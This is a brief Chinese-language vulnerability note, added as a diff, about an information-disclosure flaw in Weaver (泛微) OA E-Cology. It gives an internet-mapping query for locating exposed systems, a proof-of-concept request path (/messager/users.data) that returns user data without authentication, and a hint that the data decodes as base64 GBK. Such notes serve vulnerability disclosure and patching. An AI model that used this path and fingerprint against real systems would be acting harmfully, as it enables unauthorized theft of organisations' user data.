@@ -1,0 +1,33 @@
+# 泛微OA E-Cology users.data 敏感信息泄漏
+
+## 漏洞描述
+
+泛微OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息
+
+## 漏洞影响
+
+```
+泛微OA E-Cology
+```
+
+## 网络测绘
+
+```
+app="泛微-协同商务系统"
+```
+
+## 漏洞复现
+
+登录页面
+
+![image-20220520134158756](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112925862.png)
+
+验证POC
+
+```
+/messager/users.data
+```
+
+![image-20220520134209598](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112925863.png)
+
+base64 GBK解码
